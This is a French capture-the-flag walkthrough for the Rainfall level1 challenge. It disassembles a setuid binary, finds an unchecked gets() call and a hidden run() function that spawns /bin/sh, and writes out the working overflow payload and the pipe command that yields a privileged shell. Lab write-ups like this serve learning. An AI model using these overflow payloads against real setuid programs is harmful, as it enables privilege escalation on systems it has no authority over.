# Walkthrough — Rainfall : Level1

##  Objectif

Obtenir le mot de passe du `level2` en exploitant le binaire `level1`, qui est setuid `level2`. Si on arrive à exécuter un shell **pendant que le programme tourne**, le shell héritera des droits de `level2` et on pourra lire `/home/user/level2/.pass`.

---

## 1. Reconnaissance

### Permissions du binaire

```
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

Le `s` dans `rws` indique le **setuid bit** : quand on exécute le binaire, le processus tourne avec les droits de son propriétaire (`level2`). C'est exactement ce qu'on veut exploiter.

### Comportement à l'exécution

```bash
$ ./level1
AAA            ← on tape quelque chose
$              ← le programme se termine sans rien afficher
```

Pas d'invite, pas de message. Le programme attend silencieusement une entrée puis se termine.

### Trace des appels système

```bash
$ ltrace ./level1
gets(0xbffff710, 47, 0xbffff75c, 0xb7fd0ff4, 0x80484a0)
```

🚨 **Mot magique : `gets`**. C'est LA fonction la plus dangereuse de la libc : elle lit `stdin` jusqu'à `\n` **sans aucune limite de taille**. Vulnérabilité de buffer overflow quasi garantie.

---

## 2. Analyse statique avec gdb

### Désassemblage de `main`

```asm
0x08048480 <+0>:   push   %ebp
0x08048481 <+1>:   mov    %esp,%ebp
0x08048483 <+3>:   and    $0xfffffff0,%esp
0x08048486 <+6>:   sub    $0x50,%esp          ← réserve 80 octets sur la pile
0x08048489 <+9>:   lea    0x10(%esp),%eax
0x0804848d <+13>:  mov    %eax,(%esp)
0x08048490 <+16>:  call   0x8048340 <gets@plt>
0x08048495 <+21>:  leave
0x08048496 <+22>:  ret
```

Traduction en C :

```c
int main(void) {
    char buffer[64];  // 0x50 - 0x10 = 64 bytes (taille réelle du buffer)
    gets(buffer);
    return 0;
}
```

```asm
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
---Type <return> to continue, or q <return> to quit---
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run <- fonction cachée !>
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

### La fonction cachée `run` qui n'est pas utilisée dans `main`


```asm
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave  
   0x0804847f <+59>:    ret    
End of assembler dump.
```

Et :

```
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

💡 **Découverte clé** : il existe une fonction `run()` à l'adresse `0x08048444` qui appelle directement `system("/bin/sh")`. **Plus besoin de chercher `system` dans la libc.**

---

## 3. Le plan d'attaque

### Disposition de la pile pendant `main`

```
Adresses hautes
┌──────────────────────────┐
│ Adresse de retour (4 oct)│  ← cible : on l'écrase avec &run
├──────────────────────────┤
│ Saved EBP     (4 oct)    │  ← à écraser aussi (junk)
├──────────────────────────┤
│ Padding alignement(8 oct)│  ← ajouté par and $0xfffffff0,%esp
├──────────────────────────┤
│ Buffer        (64 oct)   │  ← gets écrit ici
└──────────────────────────┘
Adresses basses (esp)
```

Total padding avant l'adresse de retour : 64 + 8 + 4 = **76 octets** (vérifié expérimentalement).

### Schéma du payload

```
[ XX octets de remplissage ][ adresse de run (4 octets) ]
                              0x08048444 → \x44\x84\x04\x08
```

Note le **little-endian** : l'adresse `0x08048444` s'écrit en mémoire à l'envers, octet faible en premier.

## 4. L'exploit

### Génération du payload

```bash
python -c 'print "B"*76 + "\x44\x84\x04\x08"' > /tmp/payload
```

- `B` × 76 → padding qui remplit le buffer + comble jusqu'à l'adresse de retour
- `\x44\x84\x04\x08` → adresse de `run()` en little-endian

### Lancement

```bash
cat /tmp/payload - | ./level1
```

Décortiquons cette commande :
- `cat /tmp/payload` → envoie le payload à stdin de level1
- Le `-` après → **dit à `cat` de continuer en lisant le clavier** une fois le fichier terminé
- `|` → tout est redirigé vers stdin de `./level1`

Sans le `-`, le shell s'ouvrirait puis se fermerait immédiatement (plus rien sur stdin).

### Résultat

```bash
$ cat /tmp/payload - | ./level1
Good... Wait what?            ← message affiché par run() via fwrite
whoami
level2                        ← 🎉 on est level2 !
cat /home/user/level2/.pass
pass
```

---

## 5. Récapitulatif des techniques

| Concept | Application ici |
|---|---|
| **Buffer overflow** | `gets()` permet d'écrire au-delà du buffer |
| **Écrasement de l'adresse de retour** | On contrôle où `ret` saute |
| **Return-to-function** | On saute vers une fonction existante du binaire (`run`) |
| **Little-endian** | Les adresses x86 sont stockées octet faible en premier |
| **Setuid exploitation** | Le shell hérite des droits du propriétaire du binaire |

---

## 6. Erreurs commises (et leçons retenues)

1. **Premier essai avec offset 68** → segfault. L'offset théorique n'est pas toujours le bon, il faut le vérifier expérimentalement.
2. **Tentative de return-to-libc** avec l'adresse de `"/bin/sh"` trouvée dans gdb → segfault hors gdb à cause de l'**ASLR** (l'adresse de la libc change à chaque exécution).
3. **Découverte tardive de `run()`** → la fonction était la « porte d'entrée » prévue par l'auteur. **Toujours désassembler TOUTES les fonctions, pas seulement `main`**, avant de se lancer dans un exploit compliqué.

---

## 7. Pourquoi le saut vers `run` est plus simple que return-to-libc

| Critère | Return-to-libc | Saut vers `run` |
|---|---|---|
| Nombre d'adresses à connaître | 3 (`system`, ret_dummy, `"/bin/sh"`) | 1 (`run`) |
| Stabilité de l'adresse | ❌ ASLR change l'adresse de la libc | ✅ Adresse fixe dans le binaire |
| Taille du payload | 80 octets | 80 octets |
| Fonctionne hors gdb | ❌ (sans contournement d'ASLR) | ✅ |

**Conclusion** : quand le binaire t'offre une porte de sortie (une fonction qui spawn un shell), prends-la. C'est presque toujours plus robuste qu'un return-to-libc.